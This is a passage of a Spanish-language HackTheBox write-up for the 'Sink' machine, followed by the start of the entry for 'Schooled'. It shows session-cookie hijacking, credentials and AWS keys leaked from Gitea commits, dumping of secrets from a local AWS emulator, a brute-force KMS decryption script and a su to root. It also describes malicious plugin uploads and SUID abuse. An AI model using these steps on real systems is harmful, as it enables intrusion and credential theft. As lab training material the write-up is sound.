A√±adimos una nueva cookie, le ponemos de nombre session y pegamos la cookie que encontramos y damos clic en guardar (add). Ahora simplemente recargamos la p√°gina y estar√≠amos dentro como el usuario admin@sink. htb:  ‚Ä¶ Encontramos cositas siendo el usuario admin üìå: Si revisamos las notas tenemos 3: El contenido de cada una es el siguiente: Note (1):Chef Login : http://chef. sink. htb Username : chefadm Password : /G'FEGc&amp;zEx{4]zzNote (2):Dev Node URL : http://code. sink. htb Username : root Password : FaH@3I&gt;ZB})zzfO3Note (3):Nagios URL : https://nagios. sink. htb Username : nagios_adm Password : gB&gt;HGGK\{*L. f83COpa, tenemos 3 nuevas URL (una aparentemente con certificado SSL), con sus respectivos usuarios y contrase√±as‚Ä¶ Agregu√©moslas al /etc/hosts e inspeccionemos‚Ä¶ ‚ù≠ cat /etc/hosts. . . 10. 10. 10. 225 chef. sink. htb code. sink. htb nagios. sink. htb. . . Pero al colocarlos en la web, ninguno redirecciona a ning√∫n sitio. Y pues tiene sentido, no sabemos en qu√© puerto est√°n corriendo por lo tanto no encuentra realmente lo que tiene que resolver‚Ä¶ Pero pues tenemos credenciales y si recordamos, hay un servicio sobre el puerto 3000 (Gitea) con panel login (y en el cual uno de los usuarios era root), intentemos usar la contrase√±a que tenemos de root sobre ese login: Yyyyy: Perfecto, tamos dentro, ahoraaaaaaaaaaaaaaaaaaa a enumerar :P Enumeramos el servicio Gitea como el usuario root üìå: Nos encontramos con 4 repositorios (aunque solo se vean 3 en la imagen hay 4): 'root' created repository 'root/Key_Management'2 months agoO sea que tenemos: Repositorios:* Log_Management. * Key_Management. * Serverless-Plugin. * Kinesis_ElasticSearch. Revisando cada uno, sus respectivos commits y contenido encontramos esto:  El usuario marcus es el que hace los push (sube los cambios), root simplemente crea los repos. Cositas relevantes de cada repo: ‚Ä¶ ü™ï Log_Management (commits): Si entramos en ese commit, tenemos el access key ID y la secret access key de AWS (Amazon Web Services): &lt;?phprequire 'vendor/autoload. php';use Aws\CloudWatchLogs\CloudWatchLogsClient;use Aws\Exception\AwsException;$client = new CloudWatchLogsClient([    'region' =&gt; 'eu',    'endpoint' =&gt; 'http://127. 0. 0. 1:4566',    'credentials' =&gt; [        'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ',        'secret' =&gt; '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'    ],    'version' =&gt; 'latest']);try {$client-&gt;createLogGroup(array(    'logGroupName' =&gt; 'Chef_Events',));}catch (AwsException $e) {  echo $e-&gt;getMessage();  echo  \n ;}try {$client-&gt;createLogStream([    'logGroupName' =&gt; 'Chef_Events',    'logStreamName' =&gt; '20201120']);}catch (AwsException $e) {  echo $e-&gt;getMessage();  echo  \n ;}?&gt;Podemos tenerlo en cuenta (adem√°s del puerto 4566 sobre el `lo), ya que en el siguiente commit esos valores son remplazados: ‚Ä¶ ü™ï Key_Management (commits): Ahora entremos en ese commit en concreto: Nos encontramos con la llave privada de un usuario (posiblemente de marcus) guardada en el archivo . keys/dev_keys. En el mismo commit vemos como usa la llave mediante el objeto ec2. php: &lt;?phprequire 'vendor/autoload. php';use Aws\Ec2\Ec2Client;$ec2Client = new Aws\Ec2\Ec2Client([  'region' =&gt; 'eu',  'version' =&gt; '2020-12-21',  'profile' =&gt; 'default',  'endpoint' =&gt; 'http://127. 0. 0. 1:4566']);$keyPairName = 'dev_keys';$result = $ec2Client-&gt;createKeyPair(array(  'KeyName' =&gt; $keyPairName));// Save the private key$saveKeyLocation = getenv('HOME') .  . keys/{$keyPairName} ;file_put_contents($saveKeyLocation, $result['keyMaterial']);// Update the key's permissions so it can be used with SSHchmod($saveKeyLocation, 0600);Y para pasar a producci√≥n cambian el archivo dev_keys por prod_keys: ‚Ä¶ Bueno, pues probemos a copiarnos esa key, pasarla a un archivo, darle los permisos necesarios (chmod 600 &lt;file&gt;) e intentar acceder mediante SSH con alguno de los usuarios, inicialmente con marcus que fue el que hizo el push:  En los dem√°s repos no encontre nada realmente relevante :s ‚ù≠ chmod 600 dev_keys ‚ù≠ ssh marcus@10. 10. 10. 225 -i dev_keys Welcome to Ubuntu 20. 04. 1 LTS (GNU/Linux 5. 4. 0-53-generic x86_64). . . Yyyyy estamos dentroooooooooooooooooo: marcus@sink:~$ iduid=1001(marcus) gid=1001(marcus) groups=1001(marcus)marcus@sink:~$ lsuser. txtmarcus@sink:~$ ls /homedavid git marcusmarcus@sink:~$Niceeeeeeeeeeeeeeeeeee. LOCO LOCOOOOOOOOOOOOOOo lo del smuggling. Ahora si, quien sabe que nos espere :o ‚Ä¶ AWS Secrets: marcus -&gt; david #Si enumeramos servicios recordamos al puerto que hab√≠amos visto antes, el 4566: marcus@sink:~$ netstat -lActive Internet connections (only servers)Proto Recv-Q Send-Q Local Address      Foreign Address     Statetcp    0   0 localhost:33060     0. 0. 0. 0:*        LISTENtcp    0   0 localhost:mysql     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-1    0. 0. 0. 0:*        LISTENtcp    0   0 localhost:34833     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-2    0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-3    0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-4    0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-5    0. 0. 0. 0:*        LISTENtcp    0   0 localhost:domain    0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-6    0. 0. 0. 0:*        LISTENtcp    0   0 localhost:4566     0. 0. 0. 0:*        LISTENtcp    0   0 0. 0. 0. 0:ssh       0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:x11-7    0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6008     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6009     0. 0. 0. 0:*        LISTENtcp    0   0 localhost:smtp     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6010     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6011     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6012     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6013     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6014     0. 0. 0. 0:*        LISTENtcp    0   0 172. 17. 0. 1:6015     0. 0. 0. 0:*        LISTEN. . . Adem√°s de muchos otros pero sobre una IP diferente que me recordo a Docker, enumeremos el servicio docker a ver que encontramos: marcus@sink:~$ systemctl status docker‚óè docker. service - Docker Application Container Engine   Loaded: loaded (/lib/systemd/system/docker. service; disabled; vendor preset: enabled)   Active: active (running) since Wed 2021-02-24 25:25:25 UTC; 25h agoTriggeredBy: ‚óè docker. socket    Docs: https://docs. docker. com  Main PID: 1487 (dockerd)   Tasks: 147   Memory: 150. 5M   CGroup: /system. slice/docker. service       ‚îú‚îÄ1487 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd. sock       ‚îú‚îÄ2225 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 4566 -container-ip 172. 18. 0. 2 -container-port 4566       ‚îú‚îÄ2313 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6000 -container-ip 172. 17. 0. 2 -container-port 8080       ‚îú‚îÄ2363 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6010 -container-ip 172. 17. 0. 3 -container-port 8080       ‚îú‚îÄ2394 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6007 -container-ip 172. 17. 0. 4 -container-port 8080       ‚îú‚îÄ2447 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6013 -container-ip 172. 17. 0. 5 -container-port 8080       ‚îú‚îÄ2502 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6012 -container-ip 172. 17. 0. 6 -container-port 8080       ‚îú‚îÄ2552 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6002 -container-ip 172. 17. 0. 7 -container-port 8080       ‚îú‚îÄ2594 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6011 -container-ip 172. 17. 0. 8 -container-port 8080       ‚îú‚îÄ2642 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6014 -container-ip 172. 17. 0. 9 -container-port 8080       ‚îú‚îÄ2682 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6009 -container-ip 172. 17. 0. 10 -container-port 8080       ‚îú‚îÄ2740 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6015 -container-ip 172. 17. 0. 11 -container-port 8080       ‚îú‚îÄ2780 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6006 -container-ip 172. 17. 0. 12 -container-port 8080       ‚îú‚îÄ2844 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6005 -container-ip 172. 17. 0. 13 -container-port 8080       ‚îú‚îÄ2873 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6001 -container-ip 172. 17. 0. 14 -container-port 8080       ‚îú‚îÄ2907 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6003 -container-ip 172. 17. 0. 15 -container-port 8080       ‚îú‚îÄ2953 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6008 -container-ip 172. 17. 0. 16 -container-port 8080       ‚îî‚îÄ3115 /usr/bin/docker-proxy -proto tcp -host-ip 172. 17. 0. 1 -host-port 6004 -container-ip 172. 17. 0. 17 -container-port 8080marcus@sink:~$ Opa, vemos que esta corriendo varios contenedores, al inicio tenemos al que estamos buscando: . . . ‚îú‚îÄ2225 /usr/bin/docker-proxy -proto tcp -host-ip 127. 0. 0. 1 -host-port 4566 -container-ip 172. 18. 0. 2 -container-port 4566. . . Bien, sabemos que es un contenedor. Validemos que esta corriendo sobre √©l: marcus@sink:~$ curl http://localhost:4566 ; echo{ status :  running }Esta respuesta me acord√≥ a la m√°quina:  Spoiler: Nombre de la otra m√°quina  BucketEn la que tambi√©n jug√°bamos con AWS y contenedores. Podemos hacer dos cosas, un Remote Port Forwarding (redireccionamiento de puertos) y validar con nmap si encontramos algo y adem√°s hacer algo de fuzzing para ver si hay otras rutas‚Ä¶ O podemos volver a hablar de la m√°quina (del spoiler) y recordar que en el fuzzing hecho all√°, obten√≠amos la ruta /health que nos sirve para validar el rendimiento y disponibilidad de los recursos de AWS.  ¬øQu√© es AWS Health?Entonces podemos hacer una petici√≥n ahora junto al /health y ver que servicios (y su estado) esta corriendo AWS: marcus@sink:~$ curl http://localhost:4566/health ; echo{ services : { logs :  running ,  secretsmanager :  running ,  kms :  running }}Perfectowowo e. e Pues tenemos 3 servicios activos y corriendo:  logs secretsmanager kmsY podemos apoyarnos del API de Amazon Web Services (aws) para jugar con lo que encontramos y ver si podemos sacar algo importante: Probemos con logs primero, intentemos ver la descripci√≥n de los grupos de logs creados: marcus@sink:~$ aws --endpoint-url=http://localhost:4566 --region us-east-1 logs describe-log-groupsUnable to locate credentials. You can configure credentials by running  aws configure . Si ejecutamos ese comando nos pide: marcus@sink:~$ aws configureAWS Access Key ID [None]:AWS Secret Access Key [None]:Default region name [None]:Default output format [None]:Si recordamos en Gitea hab√≠amos encontrado un commit que ten√≠a esta informaci√≥n, busqu√©mosla y pong√°mosla ac√°‚Ä¶ . . . $client = new CloudWatchLogsClient([    'region' =&gt; 'eu',    'endpoint' =&gt; 'http://127. 0. 0. 1:4566',    'credentials' =&gt; [        'key' =&gt; 'AKIAIUEN3QWCPSTEITJQ',        'secret' =&gt; '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'    ],    'version' =&gt; 'latest']);. . . (Aunque para comprobar el funcionamiento coloque primero cualquier valor en los dos y aun as√≠ me trajo la informaci√≥n, as√≠ que no es necesaria esta config (supongo)) marcus@sink:~$ aws configureAWS Access Key ID [None]: asdAWS Secret Access Key [None]: asdfsadfDefault region name [None]: us-east-1Default output format [None]: json ¬øD√≥nde se guardan las configuraciones hechas mediante AWS CLI?. Y si ejecutamos de nuevo: marcus@sink:~$ aws --endpoint-url=http://localhost:4566 logs describe-log-groups{   logGroups : [    {       logGroupName :  cloudtrail ,       creationTime : 1614265741999,       metricFilterCount : 0,       arn :  arn:aws:logs:us-east-1:000000000000:log-group:cloudtrail ,       storedBytes : 91    }  ]}Listones, si jugamos as√≠ con algunos par√°metros podremos ir descubriendo info. Ahora veamos algo de secretsmanager: marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager list-secrets{   SecretList : [    {       ARN :  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv ,       Name :  Jenkins Login ,       Description :  Master Server to manage release cycle 1 ,       KmsKeyId :   ,       RotationEnabled : false,       RotationLambdaARN :   ,       RotationRules : {         AutomaticallyAfterDays : 0      },       Tags : [],       SecretVersionsToStages : {         53cf9fdf-cb47-4b35-9ba1-046bcb43cfb6 : [           AWSCURRENT         ]      }    },    {       ARN :  arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI ,       Name :  Sink Panel ,       Description :  A panel to manage the resources in the devnode ,       KmsKeyId :   ,       RotationEnabled : false,       RotationLambdaARN :   ,       RotationRules : {         AutomaticallyAfterDays : 0      },       Tags : [],       SecretVersionsToStages : {         97d47d9b-6e95-459e-a0b4-60411a9054d2 : [           AWSCURRENT         ]      }    },    {       ARN :  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR ,       Name :  Jira Support ,       Description :  Manage customer issues ,       KmsKeyId :   ,       RotationEnabled : false,       RotationLambdaARN :   ,       RotationRules : {         AutomaticallyAfterDays : 0      },       Tags : [],       SecretVersionsToStages : {         b07ec8cf-4f71-41bb-b20b-023d874be8a9 : [           AWSCURRENT         ]      }    }  ]}Obtenemos 3 plataformas:  Jenkins Login: Master Server to manage release cycle 1.  Sink Panel: A panel to manage the resources in the devnode.  Jira Support: Manage customer issues. Si intentamos ver alguna data en concreto (los secretos) podemos hacerlo usando el ID, que ser√≠a el valor  ARN . Por ejemplo, veamos el valor secreto de Jenkins Login (get-secret-value): üõπ Jenkins Login. marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv {   ARN :  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-AZIdv ,   Name :  Jenkins Login ,   VersionId :  53cf9fdf-cb47-4b35-9ba1-046bcb43cfb6 ,   SecretString :  {\ username\ :\ john@sink. htb\ ,\ password\ :\ R);\\)ShS99mZ~Bj\ } ,   VersionStages : [     AWSCURRENT   ],   CreatedDate : 1614230338}Opa, el valor secreto son unas credenciales:  john@sink. htb : R);\\)ShS99mZ~Bj o R);\)ShS99mZ~BjAntes de ver si son funcionales, validemos con los otros 2 IDs para ver que tienen: üõπ Sink Panel. marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id  arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI {   ARN :  arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-ILKxI ,   Name :  Sink Panel ,   VersionId :  97d47d9b-6e95-459e-a0b4-60411a9054d2 ,   SecretString :  {\ username\ :\ albert@sink. htb\ ,\ password\ :\ Welcome123!\ } ,   VersionStages : [     AWSCURRENT   ],   CreatedDate : 1614230338} albert@sink. htb : Welcome123!üõπ Jira Support. marcus@sink:~$ aws --endpoint-url=http://localhost:4566 secretsmanager get-secret-value --secret-id  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR {   ARN :  arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-fKqdR ,   Name :  Jira Support ,   VersionId :  b07ec8cf-4f71-41bb-b20b-023d874be8a9 ,   SecretString :  {\ username\ :\ david@sink. htb\ ,\ password\ :\ EAL8=bcC=`a7f2#k\ } ,   VersionStages : [     AWSCURRENT   ],   CreatedDate : 1614230338} david@sink. htb : EAL8=bcC=a7f2#k`Ac√° david es interesante porque lo tenemos presente como usuario de Gitea y tambi√©n como usuario de la propia m√°quina. Validemos en el panel login de Gitea estas credenciales: Son funcionales. Probemos si podemos hacer reutilizaci√≥n de contrase√±as e intentemos migrarnos a david pero desde el sistema: marcus@sink:~$ su davidPassword: david@sink:/home/marcus$ whoamidaviddavid@sink:/home/marcus$ iduid=1000(david) gid=1000(david) groups=1000(david)david@sink:/home/marcus$ Perfectoooooooooooooooooooooooooooooooooooo, somos david ahora (: Antes, veamos si hay algo importante usando kms con AWS CLI: marcus@sink:~$ aws --endpoint-url=http://localhost:4566 kms list-keys{   Keys : [    {        KeyId :  0b539917-5eff-45b2-9fa1-e13f0d2c42ac ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac     },    {        KeyId :  16754494-4333-4f77-ad4c-d0b73d799939 ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939     },    {        KeyId :  2378914f-ea22-47af-8b0c-8252ef09cd5f ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f     },    {        KeyId :  2bf9c582-eed7-482f-bfb6-2e4e7eb88b78 ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78     },    {        KeyId :  53bb45ef-bf96-47b2-a423-74d9b89a297a ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a     },    {        KeyId :  804125db-bdf1-465a-a058-07fc87c0fad0 ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0     },    {        KeyId :  837a2f6e-e64c-45bc-a7aa-efa56a550401 ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401     },    {        KeyId :  881df7e3-fb6f-4c7b-9195-7f210e79e525 ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525     },    {       KeyId :  c5217c17-5675-42f7-a6ec-b5aa9b9dbbde ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde     },    {       KeyId :  f0579746-10c3-4fd1-b2ab-f312a5a0f3fc ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc     },    {       KeyId :  f2358fef-e813-4c59-87c8-70e50f6d4f70 ,       KeyArn :  arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70     }  ]}Tenemos unas keys, no s√© si sean relevantes, pero pues para tenerlas en cuenta, de los otros par√°metros no podemos obtener algo. Sigamos‚Ä¶ ‚Ä¶ Escalada de privilegios #En el /home de david tenemos un par de carpetas que nos llevan a un objeto. enc: david@sink:~$ lsProjectsdavid@sink:~$ cd Projects/david@sink:~/Projects$ lsProd_Deploymentdavid@sink:~/Projects$ cd Prod_Deployment/david@sink:~/Projects/Prod_Deployment$ lsservers. encdavid@sink:~/Projects/Prod_Deployment$ file servers. enc servers. enc: dataIntentando crackearlo no hacemos nada :P Veamos que podemos relacionar para leer el archivo. Bueno, buscando encontramos como se pudo haber generado el archivo mediante aws:  How to encrypt and decrypt with AWS CLI. Podemos ver que para generar el archivo se usa un keyId yyyyyyy anteriormente encontramos varios keyIds. Tengamos esto presente‚Ä¶ No contamos con aw, pero mediante kms tenemos varias funciones para jugar con los keyId`, una llamada decrypt:  AWS CLI kms decrypt. Entonces, seg√∫n la documentaci√≥n el argumento obligatorio seria:  --ciphertext-blob fileb://: Que ah√≠ le indicamos la ruta del archivo . encPodemos intentar desencriptar el archivo servers. enc: # Con ruta absoluta:david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --ciphertext-blob fileb://home/david/Projects/Prod_Deployment/servers. enc Error parsing parameter '--ciphertext-blob': Unable to load paramfile fileb://home/david/Projects/Prod_Deployment/servers. enc: [Errno 2] No such file or directory: 'home/david/Projects/Prod_Deployment/servers. enc'# Escapando la ruta absoluta:david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers. enc An error occurred (AccessDeniedException) when calling the Decrypt operation: The ciphertext refers to a customer master key that does not exist, does not exist in this region, or you are not allowed to access. Pero nada, solo vemos errores, entiendo que debemos indicarle la keyId, elijamos cualquiera y veamos que sucede: david@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --key-id  f0579746-10c3-4fd1-b2ab-f312a5a0f3fc  --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers. enc An error occurred (DisabledException) when calling the Decrypt operation: f0579746-10c3-4fd1-b2ab-f312a5a0f3fc is disabled. Nos indica que la operaci√≥n Decrypt esta inhabilitada para esa key, leyendo de nuevo la doc de kms hay un argumento para habilitar una key, probemos a ver si de eso se trata el error: # Habilitamosdavid@sink:~$ aws --endpoint-url=http://localhost:4566 kms enable-key --key-id  f0579746-10c3-4fd1-b2ab-f312a5a0f3fc # Ejecutamos de nuevodavid@sink:~$ aws --endpoint-url=http://localhost:4566 kms decrypt --key-id  f0579746-10c3-4fd1-b2ab-f312a5a0f3fc  --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers. enc An error occurred (InvalidCiphertextException) when calling the Decrypt operation: Obtenemos un error diferente, relacionado posiblemente a la desencriptaci√≥n en concreto ( Invalid Ciphertext) o quiz√°s a que esa key no es la necesaria para ese archivo‚Ä¶ Cre√©monos un script para que nos valide con todas las keys. Las extraemos: En el script las guardaremos en un archivo temporal para ir leyendo cada una, ahora si hagamos el archivo:  Agregaremos los argumentos --output text y --query Plaintext (These parameters extract the decrypted data, called the plaintext, from the command‚Äôs output. )#!/bin/bash# Generamos el archivo con las keysaws --endpoint-url=http://localhost:4566 kms list-keys | grep KeyId | cut -d ' ' -f 4 &gt; keys. tmpfile_with_keys=. /keys. tmpwhile read keyId; do # Tomamos cada llave del archivo  # Habilitamos la llave  aws --endpoint-url=http://localhost:4566 kms enable-key --key-id  $keyId  2&gt;/dev/null  echo -ne  \n$keyId:   # Desencriptamos el archivo servers. enc  aws --endpoint-url=http://localhost:4566 kms decrypt --key-id  $keyId  --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers. enc --output text --query Plaintextdone &lt; $file_with_keysshred -zun 10 $file_with_keysPero no obtenemos nada‚Ä¶ Probemos a jugar con los m√©todos de encriptaci√≥n: &gt; Specifies the encryption algorithm that will be used to decrypt the ciphertext. &gt;&gt; Possible values:&gt;&gt;&gt;&gt;  SYMMETRIC_DEFAULT&gt;&gt;  RSAES_OAEP_SHA_1&gt;&gt;  RSAES_OAEP_SHA_256Entonces adecuando esto a nuestro script quedar√≠a: #!/bin/bash# Generamos el archivo con las keysaws --endpoint-url=http://localhost:4566 kms list-keys | grep KeyId | cut -d ' ' -f 4 &gt; keys. tmpfile_with_keys=. /keys. tmptypes_algorithms=( SYMMETRIC_DEFAULT RSAES_OAEP_SHA_1 RSAES_OAEP_SHA_256 )while read keyId; do  echo -e  \n[+] Llave: $keyId:   for algorithm in  ${types_algorithms[@]} ; do # Tomamos cada algoritmo del array y probamos    echo -ne  [*] Algoritmo: $algorithm     # Habilitamos la llave    aws --endpoint-url=http://localhost:4566 kms enable-key --key-id  $keyId  2&gt;/dev/null    # Desencriptamos el archivo servers. enc    aws --endpoint-url=http://localhost:4566 kms decrypt --key-id  $keyId  --ciphertext-blob fileb:///home/david/Projects/Prod_Deployment/servers. enc --output text --query Plaintext --encryption-algorithm $algorithm  donedone &lt; $file_with_keysshred -zun 10 $file_with_keysEjecutamos yyyy: david@sink:/dev/shm/testest$ . /valkeria. sh[+] Llave: 0b539917-5eff-45b2-9fa1-e13f0d2c42ac:[*] Algoritmo: SYMMETRIC_DEFAULTAn error occurred (InvalidCiphertextException) when calling the Decrypt operation: [*] Algoritmo: RSAES_OAEP_SHA_1An error occurred (InvalidCiphertextException) when calling the Decrypt operation:. . . Opaaaaaaa, logramos desencriptar el archivo y ver el contenido, tenemos una cadena en base64:  La llave: 804125db-bdf1-465a-a058-07fc87c0fad0.  El tipo de algoritmo: RSAES_OAEP_SHA_256. Si intentamos decodear esa string obtenemos: No obtenemos nada legible, pero de una vez pens√© en que posiblemente sea data de alg√∫n archivo, entonces tomemos el resultado del decode y guard√©moslo en un archivo y veamos que tipo de archivo es: . . . glEwRAEATgL7TAAoAAA=  | base64 -d &gt; result_b64‚ù≠ file result_b64 result_b64: gzip compressed data, from Unix, original size modulo 2^32 10240Bien, un archivo comprimido, descomprim√°moslo: ‚ù≠ gzip -d result_b64gzip: result_b64: unknown suffix -- ignoredJmmm, buscando en internet sobre este error, encontramos un foro donde alguien recomienda usar zcat:  Try to use zcat. ¬øPero por qu√© zcat? üìÅ Normalmente, los archivos comprimidos con gzip se pueden restaurar a su forma original con los comandos gzip -d o gunzip. ¬øQu√© sucede si desea ver el contenido de un archivo comprimido sin descomprimirlo? Para este prop√≥sito, necesita la utilidad zcat. linux-console üìÇ zcat will uncompress files that have the correct magic number whether they have a . gz suffix or not. linuxquestions. org Entonces, si probamos ahora con zcat: Eaaa, tenemos un archivo . yml, donde en su contenido nos encontramos con unas credenciales del usuario admin. Prob√©moslas contra el usuario root en la m√°quina: david@sink:/dev/shm/testest$ su rootPassword: root@sink:/dev/shm/testest# iduid=0(root) gid=0(root) groups=0(root)Somos roooooooooooooooooooooooooooooooooooooooot (bueno, veamos si realmente lo somos): root@sink:/dev/shm/testest# cdroot@sink:~# lsautomation desync docker-compose. yml root. txt snapS√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç√ç somos administradores del sistemaaaaaaaaa (: Solo nos quedar√≠a ver las flags‚Ä¶ ‚Ä¶ ¬°Qu√© locura eh! Me gusto demasiado la m√°quina (: Lo que m√°s me dejo loco fue el HTTP Request Smuggling. Que bonito fue este camino. el jugar con aws de esa manera, incre√≠ble. Y nada, como siempre, muchas gracias por leer (este si fue gigante)‚Ä¶ Yyyy a seguir rompiendo todo (: "
    }, {
    "id": 17,
    "url": "http://localhost:4000/htb/schooled",
    "title": "HackTheBox - Schooled",
    "body": "2021/09/11 - M√°quina FreeBSD nivel medio, linda locura, nos moveremos mucho por Moodle robando cookies, cambiando roles a los cuales no deber√≠amos cambiar e instalando plugins maliciosos. Crackearemos hashes y finalmente aprovecharemos los permisos que tenemos en el sistema con pkg install para instalar paquetes algo peligrosos.  TL;DR (Spanish writeup): Creada por: TheCyberGeek. Jugaremos con fuzzing de subdominios para encontrar un servicio moodle el cual esta infestado de problemas :P Nos aprovecharemos de un profesor que esta validando si tenemos una caracter√≠stica en nuestro perfil de estudiante para robarle su cookie de sesi√≥n y convertirnos en √©l. Estando dentro del Moodle como profesores, tendremos algunos CVEs que justamente explotan acciones como ellos. Tendremos uno en el que podremos aprovechar una mala configuraci√≥n, modificaremos el rol de nuestro usuario para permitirle a otro usuario convertirse en manager de un curso, con esto lograremos que el usuario con rol de manager por default (Lianne) instale plugins mediante un archivo . zip malicioso. Finalmente lograremos RCE como el usuario www. Adentro encontraremos archivos de configuraci√≥n, entre ellos la conf de la base de datos, nos apoyaremos de myslqshow y mysqldump para ver el contenido de una tabla con usuarios, uno de ellos conocido en el sistema. Tendremos contrase√±as cifradas, apoy√°ndonos de John The Ripper lograremos crackerlas y hacer uso de una de ellas para obtener una Shell como el usuario jamie en el sistema. Enumerando los permisos que tenemos con jamie, veremos que puede actualizar e instalar paquetes en el sistema usando pkg install. Aprovecharemos esto para que mientras se esta instalando un paquete, nosotros podamos inyectar comandos en ese mismo paquete. As√≠ estar√≠amos ejecutando las instrucciones como el usuario root. Obtendremos una Shell como √©l modificando el binario /bin/bash d√°ndole permisos SUID. ‚Ä¶ Clasificaci√≥n de la m√°quina seg√∫n la gentesita: Bastante bastante real, vulns conocidas y bastante investigaci√≥n.  Escribo para tener mis ‚Äúnotas‚Äù, por si algun d√≠a se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo mostrar lo que hice. ‚Ä¶ Camino de verdades y verdaderas mentiras.  Reconocimiento.      Enumeraci√≥n de puertos con nmap.     Enumeraci√≥n.      Recorremos el puerto 80 pa ver que hay por ah√≠.    Encontramos el servicio Moodle corriendo en el servidor web.     Explotaci√≥n.      Jugamos con un mensaje de un profesor y robamos cositas (con respeto).    Divagando y explotando la versi√≥n del Moodle.     Movimiento Lateral MySQL: www -&gt; jamie.  Escalada de privilegios. ‚Ä¶ Reconocimiento #‚Ä¶ Vemos que puertos est√°n abiertos con nmap üìå: Empezamos haciendo un escaneo de puertos, as√≠ sabemos que servicios esta corriendo la m√°quina: ‚ù≠ nmap -p- --open -v 10. 10. 10. 234 -oG initScan      Par√°metro   Descripci√≥n         -p-   Escanea todos los 65535       ‚Äìopen   Solo los puertos que est√°n abiertos       -v   Permite ver en consola lo que va encontrando       -oG   Guarda el output en un archivo con formato grepeable para usar una funci√≥n extractPorts de S4vitar que me extrae los puertos en la clipboard   ‚ù≠ cat initScan # Nmap 7. 80 scan initiated Sun 